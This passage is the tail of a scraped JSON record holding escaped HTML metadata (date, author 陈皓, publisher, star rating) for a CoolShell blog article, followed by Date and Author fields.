content=\"2014-03-17T08:57:58+08:00\"/\u003e\u003cmeta itemprop=\"url\" content=\"https://coolshell.cn/articles/11021.html\"/\u003e\u003cmeta itemprop=\"author\" content=\"陈皓\"/\u003e\u003cmeta itemprop=\"mainEntityOfPage\" content=\"https://coolshell.cn/articles/11021.html\"/\u003e\u003cdiv style=\"display: none;\" itemprop=\"publisher\" itemscope=\"\" itemtype=\"https://schema.org/Organization\"\u003e\u003cmeta itemprop=\"name\" content=\"酷 壳 - CoolShell\"/\u003e\u003cmeta itemprop=\"url\" content=\"https://coolshell.cn\"/\u003e\u003cdiv itemprop=\"logo\" itemscope=\"\" itemtype=\"https://schema.org/ImageObject\"\u003e\u003cmeta itemprop=\"url\" content=\"\"/\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv style=\"display: none;\" itemprop=\"aggregateRating\" itemscope=\"\" itemtype=\"https://schema.org/AggregateRating\"\u003e\u003cmeta itemprop=\"bestRating\" content=\"5\"/\u003e\u003cmeta itemprop=\"worstRating\" content=\"1\"/\u003e\u003cmeta itemprop=\"ratingValue\" content=\"4.02\"/\u003e\u003cmeta itemprop=\"ratingCount\" content=\"56\"/\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv id=\"post-ratings-11021-loading\" class=\"post-ratings-loading\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/loading.gif\" width=\"16\" height=\"16\" class=\"post-ratings-image\"/\u003eLoading...\u003c/div\u003e\n\u003c/div\u003e",
  "Date": "2014-02-10T08:16:11+08:00",
  "Author": "陈皓"
}